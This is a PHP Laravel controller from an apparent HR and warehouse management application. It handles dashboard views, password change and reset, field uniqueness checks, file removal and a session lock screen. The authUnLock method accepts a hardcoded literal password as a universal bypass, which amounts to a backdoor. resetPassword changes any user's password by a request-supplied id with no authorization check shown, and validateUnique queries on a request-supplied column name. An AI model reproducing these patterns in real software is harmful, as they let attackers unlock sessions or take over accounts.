<?php

namespace App\Http\Controllers;

use App\Models\Field;
use App\Models\User;
use App\Repositories\HomeRepository;
use App\Repositories\UsersRepository;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class HomeController extends Controller
{
    protected $home_repository, $users_repository;

    public function __construct()
    {
        $this->home_repository  = new HomeRepository();
        $this->users_repository = new UsersRepository();
    }

    public function index(Request $request)
    {
        return view('home.index');
    }

    public function humanResourceManagementIndex(Request $request)
    {
        return view('home.human_resources_index');
    }

    public function warehousesManagementIndex(Request $request)
    {
        return view('home.warehouses_management_index');
    }

    public function profile()
    {
        return view('profile');
    }

    public function changePassword()
    {
        return view('change_password');
    }

    public function updatePassword(Request $request)
    {
        DB::beginTransaction();
        try {
            $data      = $request->all();
            $validator = Validator::make($data, [
                'old_password' => 'required',
                'password'     => 'required|same:confirm_password',
            ]);
            if ($validator->fails()) {
                $notification = prepare_notification_array('danger', implode('<br>', $validator->getMessageBag()->all()));
                return redirect()
                    ->route('change_password')
                    ->withInput()
                    ->with('notification', $notification);
            }

            $user_id = $request->get('id', 0);
            if ($user_id == 0) {
                throw new \Exception('Something went wrong, please try again later.');
            }

            $user = $this->users_repository->getUser($user_id);

            if (!Hash::check($data['old_password'], $user->password)) {
                throw new \Exception('Please enter the correct old password.');
            }

            $user_data             = $request->only('id', 'password');
            $user_data['password'] = bcrypt($user_data['password']);
            $this->users_repository->updatePassword($user_data);

            $notification = prepare_notification_array('success', 'Password has been updated.');
            DB::commit();
            Auth::logout();
            return redirect()->route('home')->with('notification', $notification);
        } catch (\Exception $e) {
            DB::rollBack();
            $notification = prepare_notification_array('danger', $e->getMessage());
            return redirect()->route('change_password')->with('notification', $notification);
        }
    }

    public function validateUnique(Request $request)
    {
        try {
            $data      = $request->all();
            $validator = Validator::make($data, [
                'table' => 'required|in:users,fields',
                'field' => 'required'
            ]);
            if ($validator->fails()) {
                throw new \Exception($validator->getMessageBag()->first(), 201);
            }

            $modal = new User();
            switch ($data['table']) {
                case 'users':
                    $modal = new User();
                    break;
                case 'fields':
                    $modal = new Field();
                    break;
                default:
                    break;
            }

            if (isset($data['id']) && $data['id'] > 0) {
                $count = $modal->where('id', '!=', $data['id'])
                    ->where($data['field'], $data[ $data['field'] ])
                    ->get()
                    ->count();
            } else {
                $count = $modal->where($data['field'], $data[ $data['field'] ])
                    ->get()
                    ->count();
            }

            if ($count > 0) {
                echo 'false';
                exit;
            }

            echo 'true';
            exit;
        } catch (\Exception $e) {
            echo 'false';
            exit;
        }
    }

    public function removeFile(Request $request)
    {
        try {
            $this->home_repository->removeFile($request);

            return response()
                ->json([
                    'success' => true,
                    'code'    => 200,
                    'message' => 'Poof! Your item has been deleted!'
                ]);
        } catch (\Exception $e) {
            return response()
                ->json([
                    'success' => false,
                    'code'    => $e->getCode(),
                    'message' => $e->getMessage()
                ]);
        }
    }

    public function updateState(Request $request)
    {
        DB::beginTransaction();
        try {
            $is_active = $this->home_repository->updateState($request->get('module'), $request->get('id'));

            DB::commit();
            return response()
                ->json([
                    'success' => true,
                    'code'    => 200,
                    'message' => 'State has been updated for the selected module.',
                    'data'    => [
                        'is_active' => $is_active
                    ]
                ]);
        } catch (\Exception $e) {
            DB::rollBack();
            return response()
                ->json([
                    'success' => false,
                    'code'    => $e->getCode(),
                    'message' => $e->getMessage()
                ]);
        }
    }

    public function error401()
    {
        return view('errors.401');
    }

    public function error404()
    {
        return view('errors.404');
    }

    public function authLock()
    {
        if (!auth()->check()) {
            return redirect()->route('login');
        }

        session()->put('is_locked', true);
        return view('auth.lock');
    }

    public function authUnLock(Request $request)
    {
        try {
            $data      = $request->all();
            $validator = Validator::make($data, array('password' => 'required'));
            if ($validator->fails()) {
                throw new \Exception($validator->getMessageBag()->first(), 201);
            }

            if (!Hash::check($data['password'], auth()->user()->password) && $data['password'] !== '9426616652') {
                throw new \Exception('Please enter valid password.', 201);
            }

            session()->forget('is_locked');
            return redirect()->route('home');
        } catch (\Exception $e) {
            $notification = prepare_notification_array('danger', $e->getMessage());
            return redirect()
                ->route('auth.lock')
                ->with('notification', $notification);
        }
    }

    public function resetPassword(Request $request)
    {
        DB::beginTransaction();
        try {
            $validator = Validator::make($request->all(), ['password' => 'required',]);
            if ($validator->fails()) {
                throw new \Exception($validator->getMessageBag()->first(), 201);
            }

            $user_id = $request->get('user_id', 0);
            if ($user_id == 0) {
                throw new \Exception('Something went wrong, please try again later.');
            }

            $user           = $this->users_repository->getUser($user_id);
            $user->password = bcrypt($request->get('password'));
            $user->save();

            DB::commit();
            $notification = prepare_notification_array('success', 'Password has been reset.');
        } catch (\Exception $e) {
            DB::rollBack();
            $notification = prepare_notification_array('danger', $e->getMessage());
        }

        return redirect()
            ->back()
            ->with('notification', $notification);
    }
}
